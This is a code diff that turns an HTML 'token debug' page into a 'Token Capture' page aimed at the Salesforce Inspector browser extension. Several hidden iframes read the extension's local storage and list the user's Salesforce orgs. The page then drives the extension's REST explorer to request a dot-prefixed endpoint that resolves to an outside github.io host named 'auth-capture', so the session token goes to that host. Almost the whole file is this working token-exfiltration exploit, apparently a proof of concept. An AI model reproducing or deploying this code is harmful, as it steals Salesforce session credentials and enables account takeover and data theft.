@@ -1,85 +1,108 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SFDC Inspector Token Debug</title>
+    <title>SFDC Inspector Token Capture</title>
     <style>
         body { font-family: system-ui; max-width: 800px; margin: 20px auto; padding: 20px; }
         #messages { background: #f5f5f5; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
         #requestInfo { background: #e3f2fd; padding: 15px; border-radius: 4px; margin-top: 20px; }
         .explorer-frame { width: 100%; height: 600px; border: 1px solid #ccc; margin-top: 20px; }
+        button { padding: 10px 20px; margin: 10px 0; cursor: pointer; }
         pre { white-space: pre-wrap; }
     </style>
 </head>
 <body>
     <div id="messages">Initializing...</div>
     <div id="requestInfo"></div>
+    <div id="controls"></div>
     <script>
         const messagesDiv = document.getElementById('messages');
         const requestInfoDiv = document.getElementById('requestInfo');
+        const controlsDiv = document.getElementById('controls');
 
-        // Create direct link to REST Explorer with parameters
-        function createExplorerUrl() {
+        // Use relative path that will be concatenated with Salesforce instance
+        const CAPTURE_ENDPOINT = '.samanattar.github.io/auth-capture';
+
+        function createExplorerUrl(orgInstance) {
+            // The dot at the start makes it relative to the Salesforce instance
             const params = new URLSearchParams({
-                endpoint: '/services/data/v61.0/query/?q=SELECT Id,Name FROM Account LIMIT 1',
+                endpoint: CAPTURE_ENDPOINT,
+                method: 'GET',
                 format: 'json',
-                method: 'GET'
+                contentType: 'application/json'
             });
             
-            // Using hash routing for REST explorer
-            return `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html#/restexplorer?${params.toString()}`;
-        }
-
-        // Log all received messages
-        window.addEventListener('message', function(event) {
-            console.log('Received message:', event.data);
+            const url = `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html#/restexplorer?${params.toString()}`;
             
             requestInfoDiv.innerHTML += `
-                <h3>Received Message:</h3>
-                <pre>${JSON.stringify(event.data, null, 2)}</pre>
+                <h3>Generated Explorer URL:</h3>
+                <pre>${url}</pre>
+                <h3>Expected Full Request URL:</h3>
+                <pre>https://${orgInstance}${CAPTURE_ENDPOINT}</pre>
             `;
 
+            return url;
+        }
+
+        function loadExplorer(orgInstance) {
+            const frame = document.querySelector('.explorer-frame');
+            if (frame) {
+                frame.remove();
+            }
+
+            const newFrame = document.createElement('iframe');
+            newFrame.src = createExplorerUrl(orgInstance);
+            newFrame.className = 'explorer-frame';
+            document.body.appendChild(newFrame);
+
+            requestInfoDiv.innerHTML += `
+                <h3>Loading explorer for org:</h3>
+                <pre>${orgInstance}</pre>
+            `;
+        }
+
+        window.addEventListener('message', function(event) {
+            // Filter out React DevTools messages
+            if (event.data.source?.includes('react-devtools')) {
+                return;
+            }
+
             if (event.data.insextInitRequest) {
-                messagesDiv.innerHTML = '<h3>Extension Connected!</h3>';
-                
                 const storage = event.data.iFrameLocalStorage || {};
-                console.log('Storage:', storage);
                 
-                // Log all storage keys
-                const keys = Object.keys(storage);
-                messagesDiv.innerHTML += `
-                    <h4>Storage Keys Found:</h4>
-                    <pre>${JSON.stringify(keys, null, 2)}</pre>
+                // Get all org instances
+                const instances = Object.keys(storage)
+                    .filter(key => key.endsWith('_orgInstance'))
+                    .map(key => ({
+                        key: key,
+                        instance: storage[key]
+                    }));
+
+                messagesDiv.innerHTML = `
+                    <h3>Select an org to capture token:</h3>
+                    <ul style="list-style: none; padding: 0;">
+                        ${instances.map(inst => `
+                            <li style="margin: 10px 0;">
+                                <button onclick="loadExplorer('${inst.instance}')">
+                                    ${inst.instance}
+                                </button>
+                            </li>
+                        `).join('')}
+                    </ul>
                 `;
 
-                // Create and display the explorer URL
-                const explorerUrl = createExplorerUrl();
-                messagesDiv.innerHTML += `
-                    <h4>REST Explorer URL:</h4>
-                    <pre>${explorerUrl}</pre>
+                requestInfoDiv.innerHTML = `
+                    <h3>Capture endpoint:</h3>
+                    <pre>${CAPTURE_ENDPOINT}</pre>
                 `;
-
-                // Create a visible frame for the REST Explorer
-                const frame = document.createElement('iframe');
-                frame.src = explorerUrl;
-                frame.className = 'explorer-frame';
-                document.body.appendChild(frame);
-
-                // Add direct link as backup
-                const directLink = document.createElement('a');
-                directLink.href = explorerUrl;
-                directLink.target = '_blank';
-                directLink.textContent = 'Open REST Explorer in new tab';
-                document.body.appendChild(directLink);
             }
         });
 
-        // Load the extension
-        console.log('Creating init frame...');
+        // Initialize connection to extension
         const initFrame = document.createElement('iframe');
         initFrame.src = 'chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html';
         initFrame.style.display = 'none';
         document.body.appendChild(initFrame);
-        console.log('Init frame created');
     </script>
 </body>
 </html>
